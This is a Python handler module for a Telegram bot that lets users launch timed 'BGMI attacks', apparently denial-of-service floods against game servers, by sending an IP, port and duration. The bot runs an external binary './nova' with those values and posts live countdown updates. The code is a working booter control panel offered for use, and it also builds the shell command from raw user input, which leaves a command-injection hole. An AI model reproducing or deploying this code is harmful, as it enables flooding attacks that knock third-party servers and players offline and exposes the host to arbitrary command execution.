# bgmi_attack_handler.py
import subprocess
import threading
import time
from telebot import types
from helpers import safe_edit_message

# Store active attacks
active_bgmi_attacks = {}

def register_bgmi_attack_handlers(bot):
    """Register BGMI attack handlers"""
    
    # Command handler for groups and private chats
    @bot.message_handler(commands=['bgmi'])
    def handle_bgmi_command(message):
        """Handle /bgmi command in groups and private chats"""
        command_parts = message.text.split()
        
        # If used in group without parameters, show help
        if len(command_parts) < 4:
            help_text = (
                "🎮 <b>BGMI Attack Command</b>\n\n"
                "Usage: <code>/bgmi IP PORT TIME</code>\n\n"
                "Example:\n"
                "<code>/bgmi 192.168.1.1 80 60</code>\n\n"
                "⚠️ Max time: 300 seconds"
            )
            bot.reply_to(message, help_text, parse_mode="HTML")
            return
        
        # Extract parameters
        try:
            target = command_parts[1]
            port = command_parts[2]
            attack_time = int(command_parts[3])
            
            if attack_time > 300:
                attack_time = 300
            
            user_id = message.from_user.id
            username = message.from_user.username or f"User{user_id}"
            
            # Start attack
            response = (
                f"🎮 <b>BGMI ATTACK STARTED</b> 🎮\n\n"
                f"👤 User: @{username}\n"
                f"🎯 Target: <code>{target}</code>\n"
                f"🔌 Port: <code>{port}</code>\n"
                f"⏰ Time: <code>{attack_time}</code> seconds\n\n"
                f"⚡ Status: <b>Running...</b>"
            )
            
            sent_message = bot.reply_to(message, response, parse_mode="HTML")
            
            # Store attack info
            active_bgmi_attacks[user_id] = {
                'target': target,
                'port': port,
                'time': attack_time,
                'message_id': sent_message.message_id,
                'chat_id': message.chat.id,
                'active': True
            }
            
            # Start attack thread
            attack_thread = threading.Thread(
                target=run_bgmi_attack,
                args=(user_id, target, port, attack_time, message.chat.id, sent_message.message_id)
            )
            attack_thread.start()
            
            # Start time update thread
            time_thread = threading.Thread(
                target=update_bgmi_attack_time,
                args=(user_id, attack_time, message.chat.id, sent_message.message_id, username, target, port)
            )
            time_thread.start()
            
        except ValueError:
            bot.reply_to(message, "❌ Invalid time value! Must be a number.", parse_mode="HTML")
        except Exception as e:
            bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode="HTML")
    
    # Stop command for groups
    @bot.message_handler(commands=['stopbgmi'])
    def handle_stop_bgmi_command(message):
        """Handle /stopbgmi command to stop attacks"""
        user_id = message.from_user.id
        
        try:
            subprocess.run("pkill -f nova", shell=True)
            
            if user_id in active_bgmi_attacks:
                active_bgmi_attacks[user_id]['active'] = False
                del active_bgmi_attacks[user_id]
            
            bot.reply_to(message, "🛑 <b>BGMI Attack Stopped</b>\n\nAll attacks have been terminated.", parse_mode="HTML")
        except Exception as e:
            bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode="HTML")
    
    @bot.callback_query_handler(func=lambda call: call.data == "bgmi_attack_menu")
    def bgmi_attack_menu(call):
        """Show BGMI attack menu"""
        markup = types.InlineKeyboardMarkup(row_width=1)
        
        text = (
            "🎮 <b>BGMI Attack Mode</b>\n\n"
            "⚡ Optimized for gaming servers\n"
            "🎯 High-performance attack mode\n\n"
            "📝 <b>Usage:</b>\n"
            "Send target details in format:\n"
            "<code>IP PORT TIME</code>\n\n"
            "Example:\n"
            "<code>192.168.1.1 80 60</code>\n\n"
            "⚠️ <b>Note:</b> Attack duration max 300 seconds"
        )
        
        markup.add(
            types.InlineKeyboardButton(
                "🚀 Start Attack",
                callback_data="bgmi_attack_start"
            )
        )
        
        markup.add(
            types.InlineKeyboardButton(
                "🛑 Stop Attack",
                callback_data="bgmi_attack_stop"
            )
        )
        
        markup.add(
            types.InlineKeyboardButton(
                "⬅️ Back to Main Menu",
                callback_data="main_menu"
            )
        )
        
        safe_edit_message(
            bot,
            call,
            text,
            reply_markup=markup
        )
    
    @bot.callback_query_handler(func=lambda call: call.data == "bgmi_attack_start")
    def bgmi_attack_start(call):
        """Initiate BGMI attack input"""
        user_id = call.from_user.id
        
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton(
                "❌ Cancel",
                callback_data="bgmi_attack_menu"
            )
        )
        
        text = (
            "🎮 <b>BGMI Attack</b>\n\n"
            "Enter target details in format:\n"
            "<code>IP PORT TIME</code>\n\n"
            "Example:\n"
            "<code>192.168.1.1 80 60</code>"
        )
        
        safe_edit_message(
            bot,
            call,
            text,
            reply_markup=markup
        )
        
        # Register next step handler
        bot.register_next_step_handler(call.message, process_bgmi_attack_input)
    
    def process_bgmi_attack_input(message):
        """Process BGMI attack input"""
        try:
            command_parts = message.text.strip().split()
            
            if len(command_parts) < 3:
                markup = types.InlineKeyboardMarkup()
                markup.add(
                    types.InlineKeyboardButton(
                        "🔄 Try Again",
                        callback_data="bgmi_attack_start"
                    )
                )
                markup.add(
                    types.InlineKeyboardButton(
                        "⬅️ Back",
                        callback_data="bgmi_attack_menu"
                    )
                )
                
                bot.send_message(
                    message.chat.id,
                    "❌ Invalid format!\n\nUse: <code>IP PORT TIME</code>",
                    reply_markup=markup,
                    parse_mode="HTML"
                )
                return
            
            target = command_parts[0]
            port = command_parts[1]
            attack_time = int(command_parts[2])
            
            if attack_time > 300:
                attack_time = 300
            
            user_id = message.from_user.id
            username = message.from_user.username or "User"
            
            # Start attack
            response = (
                f"🎮 <b>BGMI ATTACK STARTED</b> 🎮\n\n"
                f"👤 User: @{username}\n"
                f"🎯 Target: <code>{target}</code>\n"
                f"🔌 Port: <code>{port}</code>\n"
                f"⏰ Time: <code>{attack_time}</code> seconds\n\n"
                f"⚡ Status: <b>Running...</b>"
            )
            
            sent_message = bot.send_message(message.chat.id, response, parse_mode="HTML")
            
            # Store attack info
            active_bgmi_attacks[user_id] = {
                'target': target,
                'port': port,
                'time': attack_time,
                'message_id': sent_message.message_id,
                'chat_id': message.chat.id,
                'active': True
            }
            
            # Start attack thread
            attack_thread = threading.Thread(
                target=run_bgmi_attack,
                args=(user_id, target, port, attack_time, message.chat.id, sent_message.message_id)
            )
            attack_thread.start()
            
            # Start time update thread
            time_thread = threading.Thread(
                target=update_bgmi_attack_time,
                args=(user_id, attack_time, message.chat.id, sent_message.message_id, username, target, port)
            )
            time_thread.start()
            
        except ValueError:
            bot.send_message(
                message.chat.id,
                "❌ Invalid time value! Must be a number."
            )
        except Exception as e:
            bot.send_message(
                message.chat.id,
                f"❌ Error: {str(e)}"
            )
    
    def run_bgmi_attack(user_id, target, port, attack_time, chat_id, message_id):
        """Run the actual BGMI attack"""
        try:
            # Check if nova binary exists
            full_command = f"./nova {target} {port} {attack_time} 70"
            subprocess.run(full_command, shell=True)
            
            if user_id in active_bgmi_attacks:
                active_bgmi_attacks[user_id]['active'] = False
            
            markup = types.InlineKeyboardMarkup()
            markup.add(
                types.InlineKeyboardButton(
                    "🔄 New Attack",
                    callback_data="bgmi_attack_start"
                )
            )
            markup.add(
                types.InlineKeyboardButton(
                    "⬅️ Menu",
                    callback_data="bgmi_attack_menu"
                )
            )
            
            final_response = (
                "🎮 <b>BGMI ATTACK FINISHED</b> 🎮\n\n"
                "✅ Attack completed successfully!"
            )
            
            try:
                bot.edit_message_text(
                    final_response,
                    chat_id,
                    message_id,
                    reply_markup=markup,
                    parse_mode="HTML"
                )
            except:
                pass
                
        except Exception as e:
            try:
                bot.send_message(chat_id, f"⚠️ Attack error: {str(e)}")
            except:
                pass
    
    def update_bgmi_attack_time(user_id, attack_time, chat_id, message_id, username, target, port):
        """Update remaining time during attack"""
        for remaining in range(attack_time, 0, -1):
            if user_id not in active_bgmi_attacks or not active_bgmi_attacks[user_id]['active']:
                break
            
            try:
                response = (
                    f"🎮 <b>BGMI ATTACK RUNNING</b> 🎮\n\n"
                    f"👤 User: @{username}\n"
                    f"🎯 Target: <code>{target}</code>\n"
                    f"🔌 Port: <code>{port}</code>\n"
                    f"⏰ Time Remaining: <b>{remaining}</b> seconds\n\n"
                    f"⚡ Status: <b>Active</b>"
                )
                
                bot.edit_message_text(
                    response,
                    chat_id,
                    message_id,
                    parse_mode="HTML"
                )
            except:
                pass
            
            time.sleep(5)
    
    @bot.callback_query_handler(func=lambda call: call.data == "bgmi_attack_stop")
    def bgmi_attack_stop(call):
        """Stop active BGMI attack"""
        user_id = call.from_user.id
        
        try:
            # Kill nova process
            subprocess.run("pkill -f nova", shell=True)
            
            if user_id in active_bgmi_attacks:
                active_bgmi_attacks[user_id]['active'] = False
                del active_bgmi_attacks[user_id]
            
            markup = types.InlineKeyboardMarkup()
            markup.add(
                types.InlineKeyboardButton(
                    "⬅️ Back",
                    callback_data="bgmi_attack_menu"
                )
            )
            
            text = "🛑 <b>Attack Stopped</b>\n\nAll BGMI attacks have been terminated."
            
            safe_edit_message(
                bot,
                call,
                text,
                reply_markup=markup
            )
            
        except Exception as e:
            bot.answer_callback_query(call.id, f"Error: {str(e)}", show_alert=True)
